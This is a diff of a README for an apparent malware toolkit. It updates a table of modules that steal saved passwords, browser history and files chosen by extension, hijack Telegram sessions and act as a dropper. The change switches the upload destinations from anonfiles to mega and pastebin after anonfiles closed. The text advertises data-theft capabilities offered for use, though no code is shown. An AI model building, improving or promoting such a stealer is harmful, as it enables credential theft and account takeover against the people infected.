@@ -33,10 +33,10 @@ Due to the closure of **anonfiles.com** I have modified the code, and it now upl
 _______________________________________________________________________________________________
 | module         | Short description                                           |
 | :------------- | :-------------                                               |
-| **Dump passwords**     | steal All passwords saved , upload file a passwords saved to **mega - anonfiles -pastebin**|
-| **Dump History**      | dump browser history upload file a History saved to **mega - anonfiles -pastebin**                                          |
+| **Dump passwords**     | steal All passwords saved , upload file a passwords saved to **mega -pastebin**|
+| **Dump History**      | dump browser history upload file a History saved to **mega -pastebin**                                          |
 | **dump files**        | Steal files from the hard drive with the extension you want upload to **mega**     |
-| **Telegram Session Hijack**      | Telegram session hijacker upload to **anonfiles**                                          |
+| **Telegram Session Hijack**      | Telegram session hijacker upload to **Mega**                                          |
 | **Dropper** | See below
 _________________________________________________________________________________________________
 
